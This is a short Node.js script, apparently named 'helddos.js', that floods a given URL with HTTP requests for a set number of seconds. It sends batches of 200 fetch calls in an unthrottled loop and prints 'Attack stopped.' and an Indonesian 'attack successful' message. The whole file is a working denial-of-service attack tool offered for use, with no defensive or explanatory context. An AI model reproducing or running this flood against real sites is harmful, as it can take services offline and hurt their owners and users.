const target = process.argv[2];
const duration = process.argv[3];

if (process.argv.length < 4 || isNaN(parseInt(duration))) {
    console.log('Invalid Usage: node helddos.js URL DURATION.');
    process.exit(1)
} else {
    const attackInterval = setInterval(() => {
        for (let i = 0; i < 200; i++) {
            fetch(target).catch(error => {});
        }
        
    });

    setTimeout(() => {
        clearInterval(attackInterval);
        console.log('Attack stopped.');
        process.exit(0);
    }, duration * 1000);
    }
console.log('Serangan sukses')